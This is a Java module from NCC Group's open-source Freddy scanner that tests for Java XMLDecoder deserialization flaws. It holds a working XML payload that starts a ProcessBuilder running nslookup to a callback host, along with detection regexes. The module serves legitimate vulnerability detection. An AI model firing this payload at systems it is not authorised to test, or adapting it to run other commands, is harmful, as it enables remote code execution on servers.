// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import java.util.regex.Pattern;
import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java XmlDecoder API.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class XmlDecoderModule extends FreddyModuleBase {
	//Collaborator payload name
	private static final String PN_XMLDECODER = "XmlDecoder";
	
	//XmlDecoder payload data
	private static final String XMLDEC_PREFIX = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><java version=\"1.8.0_40\" class=\"java.beans.XMLDecoder\"><new class=\"java.lang.ProcessBuilder\">";
	private static final String XMLDEC_SUFFIX = "<method name=\"start\" /></new></java>";
	
	protected void initialiseModule() {
		setName("XmlDecoder");
		setPlatform(TargetPlatform.JAVA);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		//Register passive/active scan payloads
		registerPassiveScanIndicator(new Pattern[] {Pattern.compile("((<)|(%3C)|(%3c))java"), Pattern.compile("version((=)|(%3D)|(%3d))"), Pattern.compile("class((=)|(%3D)|(%3d))")}, IndicatorTarget.REQUEST);
		registerPassiveScanIndicator(new Pattern[] {Pattern.compile("exception", Pattern.CASE_INSENSITIVE), Pattern.compile("java\\.beans\\.XMLDecoder\\.readObject")}, IndicatorTarget.RESPONSE);
		
		registerActiveScanExceptionPayload("<object class=\"FreddyDeser\"/>", "java.lang.ArrayIndexOutOfBoundsException: 0");
		
		registerActiveScanCollaboratorPayload(PN_XMLDECODER, false);
	}
	
	protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_XMLDECODER:
				return XMLDEC_PREFIX + "<string>nslookup</string><string>" + hostname + "</string>" + XMLDEC_SUFFIX;
		}
		return null;
	}
}
